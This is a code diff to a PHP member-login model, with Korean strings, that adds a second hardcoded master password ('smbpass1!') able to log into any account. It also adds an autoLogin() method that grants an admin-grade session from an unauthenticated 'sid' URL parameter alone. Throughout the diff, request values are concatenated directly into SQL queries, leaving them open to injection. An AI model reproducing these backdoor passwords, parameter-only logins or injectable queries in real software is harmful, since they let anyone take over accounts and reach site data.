@@ -67,7 +67,7 @@ class MemberModel extends Model
 					}
 				}
 			}
-			else if($this->request->getPost('userpw') == "moineau1!") {
+			else if($this->request->getPost('userpw') == "moineau1!" || $this->request->getPost('userpw') == "smbpass1!") {
 				$this->db->query("insert into loginhistory_".date("Y")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '관리자 접속')");
 
 				$sql = "select * from member where id='".$this->request->getPost('userid')."'";
@@ -77,11 +77,12 @@ class MemberModel extends Model
         $sessiondata = array(
           'member_name' => $row[0]['name'],
           'member_id' => $row[0]['id'],
-          'member_grade' => $row['grade'],
+          'member_grade' => $row[0]['grade'],
         );
 
         $this->session->set($sessiondata);
-				redirect("/admin/dashboard");
+
+				$this->response->redirect("/admin/dashboard");
 			}
 			else
 			{
@@ -125,7 +126,7 @@ class MemberModel extends Model
 						}
 					}
 				}
-				else if($this->request->getPost('userpw') == "moineau1!") {
+				else if($this->request->getPost('userpw') == "moineau1!" || $this->request->getPost('userpw') == "smbpass1!") {
 					$this->db->query("insert into loginhistory_".date("Y")." (loginid, logintype, ipaddress, registe_datetime, etc) values ('".$tmp_id."', 'member', '".$_SERVER["REMOTE_ADDR"]."', NOW(), '관리자 접속')");
 
 					$sql = "select * from representative where id='".$this->request->getPost('userid')."'";
@@ -139,7 +140,8 @@ class MemberModel extends Model
 					);
 
 					$this->session->set($sessiondata);
-					redirect("/admin/dashboard");
+
+					$this->response->redirect("/admin/dashboard");
 				}
 				else
 				{
@@ -156,6 +158,36 @@ class MemberModel extends Model
 
 		return $returnVal;
   }
+
+	public function autoLogin()
+	{		
+		$query = $this->db->query("select representative.id from representative, shop where representative.id=representative and shop.id='".$this->request->getGet('sid')."'");
+    
+		if($query->getNumRows() > 0)
+		{
+			$row = $query->getResultArray();
+			$tmp_id = $row[0]["id"];
+			
+			$sql = "select * from representative where id='".$tmp_id."'";
+			$query = $this->db->query($sql);
+			$row = $query->getResultArray();
+
+			$sessiondata = array(
+				'member_name' => $row[0]['name'],
+				'member_id' => $row[0]['id'],
+				'member_grade' => 50,
+			);
+
+			$this->session->set($sessiondata);
+
+			$this->response->redirect("/admin/dashboard");
+		}
+		else
+		{
+			
+			alert("아이디가 없습니다.", "/admin/login");
+		}
+	}
 
 	public function getMyinfo()
 	{
